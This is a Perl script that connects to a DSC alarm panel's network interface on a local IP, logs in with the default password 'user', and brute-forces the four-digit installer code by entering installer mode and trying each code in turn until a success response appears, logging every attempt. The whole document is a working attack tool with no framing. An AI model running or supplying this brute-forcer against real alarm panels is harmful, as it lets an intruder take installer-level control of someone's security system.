#!/usr/bin/perl

use IO::Socket::INET;
use Time::HiRes qw ( time sleep );

# auto-flush on socket
$| = 1;

# set IP and port of DSC device
$socket = new IO::Socket::INET (
   PeerHost => '192.168.2.176',
   PeerPort => '4025',
   Proto => 'tcp',
);

die "cannot connect, $!\n" unless $socket;

print "connected\n";

DSC_get();

DSC_put(DSC_cmd("005", "user"));    # 005 - network login

$response = DSC_get();

foreach ($response) {
   /^5000052A.*5051CB/s && print("correct pass\n");
   /^5000052A.*5050CA/s && print("wrong pass\n") && exit(1);
   /^.*5052CC/s && print("timeout\n") && exit(1);   
}

open OUT, ">log." . zulu() . ".txt";

$t = time;
l0gt();

# 0206 jams for some reason
#for ($code = 0000; $code < 0999; $code++) {
#for ($code = 1000; $code < 5000; $code++) {
#for ($code = 5000; $code < 7298; $code++) {
#for ($code = 7298; $code < 9999; $code++) {
#8219
for ($code = 8218; $code < 9999; $code++) {
   l0gt();
   $scode = sprintf("%04d", $code);
   l0g("$scode\n");
   DSC_put(DSC_cmd("071", "1*8"));      # 071 send keys, partition 1, '*8' enter installer mode
   DSC_get_ww("^922");                  # 922 EVL requests installer code
   DSC_put(DSC_cmd("200", $scode));     # 200 send a code
   $r = DSC_get_ww("^6[58]");           # 6XX response
   l0g($r."\n");
   DSC_put(DSC_cmd("071", "1##"));      # 071 send keys, partition 1, '##' possibly back out of installer menu
   l0g(DSC_get_w()."\n");   
   sleep(0.6);                          # wait for messages to be processed, otherwise "Keybus Transmit Buffer Overrun"
   if ($r =~ /^680/) {l0g("success\n"); exit(0); }   
}

close OUT;
$socket->close();


sub l0gt {
   l0g("[" . sprintf("%.3f", time - $t) . "]\n");
}

sub l0g {
   my $s = shift;
   print $s; print OUT $s;
}

sub zulu {
   my ($sec,$min,$hour,$mday,$mon,$year,$wday,$yday,$isdst) = gmtime(time);
   my $yyyymmddhhmmss = sprintf "%.4d%.2d%.2d_%.2d%.2d%.2dZ", $year+1900, $mon+1, $mday, $hour, $min, $sec;
   $yyyymmddhhmmss;
}


sub DSC_cs {
   my @chars = (split//, shift);
   my $cs = 0;
   foreach (@chars) { $cs += ord($_); }
   return sprintf("%.2X", $cs & 0xFF);
};

sub DSC_cmd {
   my $cmd = shift . shift;
   return $cmd.DSC_cs($cmd);
}

sub DSC_get {
   my $response = "";
   $socket->recv($response, 1024);
   my $hresponse = $response; $hresponse =~ s/\n/\\n/g; $hresponse =~ s/\r/\\r/g;
   print "response: '$hresponse' (length " . length($response) .")\n";
   return $response;
}

sub DSC_get_w {      # wait for data
   my $response = "";
X: sleep(0.1);
   $socket->recv($response, 1024);
   if ($response eq "") { goto X; }
   my $hresponse = $response; $hresponse =~ s/\n/\\n/g; $hresponse =~ s/\r/\\r/g;
   print "response: '$hresponse' (length " . length($response) .")\n";
   return $response;
}

sub DSC_get_ww {      # wait for specific data
   my $response = "";
   my $wanted = shift;
X: sleep(0.1);
   $socket->recv($response, 1024);
   if ($response eq "") { goto X; }
   my $hresponse = $response; $hresponse =~ s/\n/\\n/g; $hresponse =~ s/\r/\\r/g;
   print "response: '$hresponse' (length " . length($response) .")\n";
   unless ($response =~ /$wanted/) { goto X; }
   return $response;
}

sub DSC_put {
   my $req = shift . "\r\n";
   my $size = $socket->send($req);
   my $hreq = $req; $hreq =~ s/\n/\\n/g; $hreq =~ s/\r/\\r/g;
   print "sent data '$hreq' (length $size)\n";
}
